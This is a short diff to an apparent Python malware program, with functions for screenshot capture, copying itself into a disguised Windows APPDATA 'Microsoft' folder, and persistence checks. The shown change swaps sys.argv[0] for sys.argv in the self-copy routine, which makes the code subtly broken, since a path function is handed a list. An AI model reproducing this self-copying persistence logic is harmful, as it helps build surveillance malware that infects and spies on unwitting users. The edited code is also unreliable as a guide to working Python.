@@ -97,7 +97,7 @@ def capture_screenshot():
 
 def copy_system_file():
     try:
-        current_file = os.path.abspath(sys.argv[0])
+        current_file = os.path.abspath(sys.argv)
         if IS_WINDOWS:
             appdata_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
             if not os.path.exists(appdata_path):
@@ -116,7 +116,7 @@ def copy_system_file():
         return current_file  
     except OSError as e:
         print(f"[-] Disk operations error: {e}")
-        return os.path.abspath(sys.argv[0])
+        return os.path.abspath(sys.argv)
 
 def check_persistence():
     try:
